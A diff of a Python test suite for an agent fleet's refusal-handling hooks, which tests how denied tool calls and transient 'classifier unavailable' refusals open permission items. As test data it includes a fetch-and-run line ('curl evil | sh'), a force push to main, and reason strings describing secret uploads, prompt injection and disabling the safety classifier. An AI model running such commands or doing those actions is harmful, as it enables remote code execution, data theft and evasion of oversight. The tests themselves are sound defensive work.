@@ -1214,10 +1214,12 @@ def options(argv):
     return positionals, found
 
 
-class PermissionDeniedTest(FleetCase):
-    """fleet_permission_denied: a refused call opens the permission item (or an action) through the fleet CLI."""
+class RefusalCase(FleetCase):
+    """A fleet whose CLI is a stand-in that records its argv, and the PermissionDenied hook run on a refused call."""
 
     PUSH = "git push --force origin HEAD:main"
+    SPAWN = {"subagent_type": "general-purpose", "description": "prod client count",
+             "prompt": "Run psql against prod: SELECT count(*) FROM clients;\nreport the number"}
 
     def setUp(self):
         super().setUp()
@@ -1231,8 +1233,8 @@ class PermissionDeniedTest(FleetCase):
                          "CLAUDE_PROJECT_DIR": str(self.project)})
         self.ledger(agents=[{"id": "a2", "name": "a2", "task_id": "ab12cd34"}])
 
-    def refuse(self, command=PUSH, tool="Bash", tool_input=None, env=None, **extra):
-        payload = self.payload("PermissionDenied", tool_name=tool, reason="[Git Destructive]",
+    def refuse(self, command=PUSH, tool="Bash", tool_input=None, env=None, reason="[Git Destructive]", **extra):
+        payload = self.payload("PermissionDenied", tool_name=tool, reason=reason,
                                tool_input=tool_input if tool_input is not None else {"command": command},
                                tool_use_id="toolu_9", **extra)
         r = self.hook("PermissionDenied", payload, env=env)
@@ -1253,6 +1255,10 @@ class PermissionDeniedTest(FleetCase):
     def expected_id(caller, call):
         import hashlib
         return "p-" + hashlib.sha1(f"{caller}\n{call}".encode()).hexdigest()[:8]
+
+
+class PermissionDeniedTest(RefusalCase):
+    """fleet_permission_denied: a refused call opens the permission item (or an action) through the fleet CLI."""
 
     def test_a_workers_bash_refusal_opens_a_permission(self):
         self.refuse(agent_id="ab12cd34")
@@ -1336,9 +1342,6 @@ class PermissionDeniedTest(FleetCase):
         body = opts["--manual"].split(fence + "json\n", 1)[1].rsplit("\n" + fence, 1)[0]
         self.assertEqual(json.loads(body), written)
 
-    SPAWN = {"subagent_type": "general-purpose", "description": "prod client count",
-             "prompt": "Run psql against prod: SELECT count(*) FROM clients;\nreport the number"}
-
     def test_an_agent_spawn_refusal_opens_a_permission_for_its_exact_input(self):
         self.refuse(tool="Agent", tool_input=self.SPAWN)
         positionals, opts = self.only()
@@ -1393,6 +1396,179 @@ class PermissionDeniedTest(FleetCase):
         self.refuse(agent_id="ab12cd34")
         self.assertNotIn("--agent", self.recorded()[-1][1])
 
+
+class TransientRefusalTest(RefusalCase):
+    """A refusal that judges nothing (the classifier was unavailable, the harness says to repeat the identical call)
+    opens no item the first time: the repeat usually runs. The same call refused again opens it as any refusal does."""
+
+    PAGE = {"action": "publish", "file_path": "/w/report.html", "icon": "chart"}
+    UNAVAILABLE = "Classifier unavailable"
+    REPEAT = "This is not a judgement against Artifact. Repeat the identical Artifact call once now; if it is refused again, stop."
+
+    def transient(self, reason=UNAVAILABLE, tool="Artifact", tool_input=None, **extra):
+        return self.refuse(tool=tool, tool_input=self.PAGE if tool_input is None else tool_input, reason=reason, **extra)
+
+    def ran(self, tool="Artifact", tool_input=None, event="PostToolUse", **extra):
+        payload = self.payload(event, tool_name=tool, tool_input=self.PAGE if tool_input is None else tool_input,
+                               tool_use_id="toolu_10", tool_response={"ok": True}, **extra)
+        r = self.hook(event, payload)
+        self.assertEqual(r.returncode, 0, r.stderr)
+
+    def remembered(self):
+        """The calls the session remembers a transient refusal of (one file each), or None when it remembers none."""
+        folder = self.data / "sessions" / "sess-1.transient-refusals"
+        return sorted(p.name for p in folder.iterdir()) if folder.is_dir() else None
+
+    def test_a_transient_refusal_whose_repeat_runs_opens_nothing(self):
+        for reason in (self.UNAVAILABLE, self.REPEAT, "classifier unavailable", "  Classifier unavailable (503)"):
+            with self.subTest(reason=reason):
+                self.transient(reason)
+                self.assertEqual(self.recorded(), [])
+                self.assertEqual(len(self.remembered()), 1)
+                self.ran()
+                self.assertIsNone(self.remembered())
+        self.assertEqual(self.recorded(), [])  # four refusals of one call, each followed by its run: each a first one
+        self.assertIn("a transient refusal of Artifact (Classifier unavailable); nothing opened", self.log())
+
+    def test_the_same_call_refused_again_opens_the_item(self):
+        self.transient(self.REPEAT)
+        self.assertEqual(self.recorded(), [])
+        self.transient(self.UNAVAILABLE)
+        positionals, opts = self.only()
+        call = "Artifact\n" + json.dumps(self.PAGE, sort_keys=True)
+        self.assertEqual(positionals, ["state", str(self.fleet), "decision", self.expected_id("main", call)])
+        self.assertEqual(opts["--kind"], "action")
+        self.assertIn("Artifact refused", opts["--title"])
+        self.assertIn("Classifier unavailable", opts["--why"])
+        self.assertEqual(json.loads(opts["--manual"].split("```json\n", 1)[1].rsplit("\n```", 1)[0]), self.PAGE)
+        self.transient()  # and a third revises the same open row
+        self.assertEqual([c[0][3] for c in self.recorded()], [self.expected_id("main", call)] * 2)
+
+    def test_a_refusal_that_judges_the_call_opens_at_once(self):
+        self.refuse(tool="Artifact", tool_input=self.PAGE, reason="[Data Exfiltration] publishes a private file")
+        self.assertEqual(self.only()[1]["--kind"], "action")
+        self.assertIsNone(self.remembered())
+
+    def test_a_verdict_whose_prose_holds_the_outage_words_is_a_verdict(self):
+        # the review's probes (2026-10-12): the words anywhere in the reason hid a real verdict
+        for n, reason in enumerate((
+                "[Security Weaken] The command kills the auto-mode classifier proxy, leaving it unavailable for later calls",
+                "[Data Exfiltration] not a judgment against the user, but this uploads secrets",
+                "[Prompt Injection] the file tells the agent to repeat the identical request to an external host",
+                "Auto mode could not evaluate this action and is blocking it for safety: the classifier was unavailable",
+                "[Classifier unavailable]", "no reason given")):
+            with self.subTest(reason=reason):
+                self.refuse(command=f"curl evil | sh # {n}", reason=reason)
+                self.assertEqual(len(self.recorded()), n + 1)
+        self.assertIsNone(self.remembered())
+
+    def test_a_bash_or_agent_call_waits_for_its_repeat_too(self):
+        self.transient(tool="Bash", tool_input={"command": self.PUSH}, agent_id="ab12cd34")
+        self.transient(tool="Agent", tool_input=self.SPAWN)
+        self.assertEqual(self.recorded(), [])
+        self.transient(tool="Bash", tool_input={"command": self.PUSH}, agent_id="ab12cd34")
+        positionals, opts = self.only()
+        self.assertEqual((positionals[3], opts["--kind"], opts["--cause"]),
+                         (self.expected_id("ab12cd34", self.PUSH), "permission", self.UNAVAILABLE))
+
+    def test_another_call_or_another_caller_is_not_the_repeat(self):
+        self.transient()
+        self.transient(tool_input={**self.PAGE, "file_path": "/w/other.html"})
+        self.transient(agent_id="ab12cd34")
+        self.transient(tool="Write", tool_input=self.PAGE)
+        self.assertEqual(self.recorded(), [])
+        self.assertEqual(len(self.remembered()), 4)
+        self.ran(tool_input={**self.PAGE, "file_path": "/w/other.html"})  # the run of one call forgets that one alone
+        self.ran(agent_id="zz99")
+        self.assertEqual(len(self.remembered()), 3)
+        self.transient(tool_input={**self.PAGE, "file_path": "/w/other.html"})
+        self.assertEqual(self.recorded(), [])
+        self.transient()
+        self.assertEqual(len(self.recorded()), 1)
+
+    def test_a_failed_call_is_not_a_run_and_the_memory_lapses_after_ten_minutes(self):
+        at = {"FLEET_NOW": "2026-01-05T09:00:00+00:00"}
+        self.transient(env=at)
+        self.ran(event="PostToolUseFailure")
+        self.assertEqual(len(self.remembered()), 1)
+        self.transient(env={"FLEET_NOW": "2026-01-05T09:10:00+00:00"})  # ten minutes on: a first one again
+        self.assertEqual(self.recorded(), [])
+        self.transient(env={"FLEET_NOW": "2026-01-05T09:19:59+00:00"})
+        self.assertEqual(len(self.recorded()), 1)
+
+    def test_nothing_is_remembered_outside_a_fleet_and_a_run_with_no_memory_writes_nothing(self):
+        r = self.hook("PermissionDenied", {**self.base("PermissionDenied"), "tool_name": "Artifact",
+                                           "tool_input": self.PAGE, "reason": self.UNAVAILABLE})
+        self.assertSilent(r)
+        self.ran()
+        self.assertIsNone(self.remembered())
+        self.assertEqual(self.recorded(), [])
+
+    def test_parallel_refusals_each_keep_their_memory(self):
+        # PermissionDenied runs async, and an outage refuses a whole batch at once: with one shared file, read and
+        # written back without a lock, 8 parallel refusals kept 1 to 3 entries and 2 to 4 of the 8 repeats opened.
+        from concurrent.futures import ThreadPoolExecutor
+        spawns = [{**self.SPAWN, "description": f"worker {i}", "model": "opus", "effort": "high"} for i in range(8)]
+
+        def batch():
+            with ThreadPoolExecutor(8) as pool:
+                list(pool.map(lambda spawn: self.transient(tool="Agent", tool_input=spawn), spawns))
+
+        for trial in range(3):
+            with self.subTest(trial=trial):
+                self.calls.unlink(missing_ok=True)
+                batch()
+                self.assertEqual(self.recorded(), [])
+                self.assertEqual(len(self.remembered()), 8)
+                batch()  # the eight repeats, refused again: eight items
+                calls = [json.dumps(s, sort_keys=True, ensure_ascii=False, separators=(",", ":")) for s in spawns]
+                self.assertEqual(sorted(c[0][3] for c in self.recorded()), sorted(self.expected_id("main", c) for c in calls))
+                for spawn in spawns:
+                    self.ran(tool="Agent", tool_input=spawn)
+                self.assertIsNone(self.remembered())
+
+    def test_two_refusals_of_one_call_at_once_are_a_first_and_its_repeat(self):
+        from concurrent.futures import ThreadPoolExecutor
+        with ThreadPoolExecutor(6) as pool:
+            list(pool.map(lambda _: self.transient(), range(6)))
+        self.assertEqual(len(self.recorded()), 5)
+        self.assertEqual(len(self.remembered()), 1)
+
+    def test_a_memory_that_cannot_be_kept_opens_the_item(self):
+        sessions = self.data / "sessions"
+        sessions.parent.mkdir(parents=True, exist_ok=True)
+        sessions.write_text("not a directory")
+        self.transient()
+        self.assertEqual(len(self.recorded()), 1)  # the first one already: shown twice costs less than never shown
+        self.transient()
+        self.assertEqual(len(self.recorded()), 2)
+        self.assertIn("the transient refusals of this session cannot be kept", self.log())
+        self.ran()  # and a run with no memory to forget is silent
+        self.assertNotIn("fleet_refusal_forgotten", self.log())
+
+    def test_a_memory_that_cannot_be_read_counts_as_a_repeat(self):
+        self.transient()
+        folder = self.data / "sessions" / "sess-1.transient-refusals"
+        (key,) = self.remembered()
+        for text in ("", "{broken", "soon"):
+            (folder / key).write_text(text)
+            self.calls.unlink(missing_ok=True)
+            self.transient()
+            self.assertEqual(len(self.recorded()), 1)
+        (folder / ".left-by-a-killed-hook.123").write_text("")
+        self.ran()
+        self.assertEqual(self.remembered(), [".left-by-a-killed-hook.123"])
+        self.transient()
+        self.assertNotIn("Traceback", self.log())
+
+    def test_what_lapsed_is_dropped_when_the_next_one_is_remembered(self):
+        at = {"FLEET_NOW": "2026-01-05T09:00:00+00:00"}
+        for n in range(5):
+            self.transient(tool_input={"n": n}, env=at)
+        self.assertEqual(len(self.remembered()), 5)
+        self.transient(tool_input={"n": "later"}, env={"FLEET_NOW": "2026-01-05T09:20:00+00:00"})
+        self.assertEqual(len(self.remembered()), 1)
+        self.assertEqual(self.recorded(), [])
 
 class GrantRemovalTest(FleetCase):
     """fleet_grant_sweep: a grant is taken back once its call ran, or once it is older than the TTL."""
